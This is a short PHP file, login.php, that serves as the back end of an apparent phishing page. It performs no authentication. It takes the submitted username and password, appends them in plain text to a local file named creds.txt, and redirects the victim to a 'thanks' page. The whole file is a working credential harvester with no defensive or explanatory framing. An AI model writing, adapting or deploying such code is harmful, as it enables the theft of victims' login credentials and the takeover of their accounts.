<?php
// login.php

$username = isset($_POST['_user']) ? trim($_POST['_user']) : '';
$password = isset($_POST['_pass']) ? trim($_POST['_pass']) : '';
$returnUrl = isset($_POST['referrer']) && !empty($_POST['referrer']) ? $_POST['referrer'] : (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');

$logFile = __DIR__ . '/creds.txt';
$logEntry = date('Y-m-d H:i:s') . " | User: {$username} | Pass: {$password} | Referrer: {$returnUrl}\n";
file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

$returnUrl = urlencode($returnUrl);

header("Location: thanks.html?return={$returnUrl}");
exit;
?>
